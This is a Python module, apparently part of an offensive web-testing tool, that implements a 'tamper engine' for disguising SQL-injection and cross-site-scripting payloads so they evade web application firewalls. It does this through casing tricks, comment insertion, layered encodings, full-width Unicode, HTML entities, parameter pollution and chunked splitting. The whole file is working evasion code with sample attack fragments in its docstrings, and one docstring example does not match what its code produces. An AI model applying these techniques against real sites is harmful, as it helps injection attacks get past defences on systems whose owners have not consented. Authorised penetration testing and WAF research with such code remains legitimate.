"""
Tamper Engine for Advanced WAF Evasion and Payload Obfuscation.

Updated 2025: Added techniques from WAFFLED research (parsing discrepancy attacks),
parameter pollution, chunked encoding, and modern encoding bypass methods.

References:
  - WAFFLED: arxiv.org/html/2503.10846v3
  - 0xInfection/Awesome-WAF
"""

import random
import urllib.parse
from collections.abc import Callable


class TamperEngine:
    """
    Multi-strategy payload obfuscation engine for WAF bypass.
    Supports 12 tamper strategies across 3 escalation levels.
    """

    # ── Classic Techniques ───────────────────────────────────────────

    @staticmethod
    def random_case(payload: str) -> str:
        """SeLeCt → randomized casing to bypass case-sensitive rules."""
        return "".join(c.lower() if random.random() > 0.5 else c.upper() for c in payload)

    @staticmethod
    def url_encode(payload: str) -> str:
        return urllib.parse.quote(payload)

    @staticmethod
    def double_url_encode(payload: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(payload))

    @staticmethod
    def space_to_comment(payload: str) -> str:
        """SELECT 1 → SELECT/**/1"""
        return payload.replace(" ", "/**/")

    @staticmethod
    def space_to_plus(payload: str) -> str:
        return payload.replace(" ", "+")

    @staticmethod
    def null_byte_injection(payload: str) -> str:
        return f"{payload}%00"

    @staticmethod
    def between_operator(payload: str) -> str:
        if ">" in payload:
            return payload.replace(">", " NOT BETWEEN 0 AND ")
        if "=" in payload:
            return payload.replace("=", " LIKE ")
        return payload

    @staticmethod
    def comment_garbage(payload: str) -> str:
        """UNION SELECT → /*!50000UNION*/ /*!50000SELECT*/"""
        return payload.replace("SELECT", "/*!50000SELECT*/").replace("UNION", "/*!50000UNION*/")

    # ── 2025 Techniques ──────────────────────────────────────────────

    @staticmethod
    def unicode_normalization(payload: str) -> str:
        """Replace ASCII with full-width Unicode equivalents (U+FF01-FF5E).
        Exploits WAFs that don't normalize Unicode before pattern matching.
        Example: <script> → ＜ｓｃｒｉｐｔ＞"""
        result = []
        for c in payload:
            code = ord(c)
            if 0x21 <= code <= 0x7E:
                result.append(chr(code + 0xFEE0))
            else:
                result.append(c)
        return "".join(result)

    @staticmethod
    def html_entity_mix(payload: str) -> str:
        """Mix decimal and hex HTML entities to confuse WAF regex.
        Example: <script → &#60;&#x73;cript"""
        result = []
        for i, c in enumerate(payload):
            if i % 3 == 0 and c.isalpha():
                result.append(f"&#x{ord(c):x};")
            elif i % 5 == 0 and c.isalpha():
                result.append(f"&#{ord(c)};")
            else:
                result.append(c)
        return "".join(result)

    @staticmethod
    def parameter_pollution(payload: str) -> str:
        """Split payload across duplicate parameters (HPP).
        WAF sees individual fragments as benign; backend concatenates them.
        Returns the payload with a split marker for the caller to handle."""
        if len(payload) > 6:
            mid = len(payload) // 2
            return f"{payload[:mid]}&__hpp__={payload[mid:]}"
        return payload

    @staticmethod
    def chunked_body_split(payload: str) -> str:
        """Simulate chunked transfer encoding fragmentation.
        Some WAFs fail to reassemble chunked bodies before inspection."""
        chunk_size = max(3, len(payload) // 4)
        chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]
        return "\r\n".join(f"{len(c):x}\r\n{c}" for c in chunks) + "\r\n0\r\n\r\n"

    @staticmethod
    def get_techniques() -> list[Callable]:
        return [
            TamperEngine.random_case,
            TamperEngine.space_to_comment,
            TamperEngine.comment_garbage,
            TamperEngine.double_url_encode,
            TamperEngine.unicode_normalization,
            TamperEngine.html_entity_mix,
            TamperEngine.parameter_pollution,
        ]

    def tamper(self, payload: str, level: str = "standard") -> list[str]:
        """Generate tampered variants at escalating aggressiveness."""
        tampered = {payload}

        if level in ("standard", "aggressive"):
            tampered.add(self.random_case(payload))
            tampered.add(self.space_to_comment(payload))

        if level == "aggressive":
            tampered.add(self.comment_garbage(payload))
            tampered.add(self.double_url_encode(payload))
            tampered.add(self.null_byte_injection(payload))
            tampered.add(self.space_to_comment(self.random_case(payload)))
            # 2025 techniques
            tampered.add(self.unicode_normalization(payload))
            tampered.add(self.html_entity_mix(payload))
            tampered.add(self.parameter_pollution(payload))

        return list(tampered)
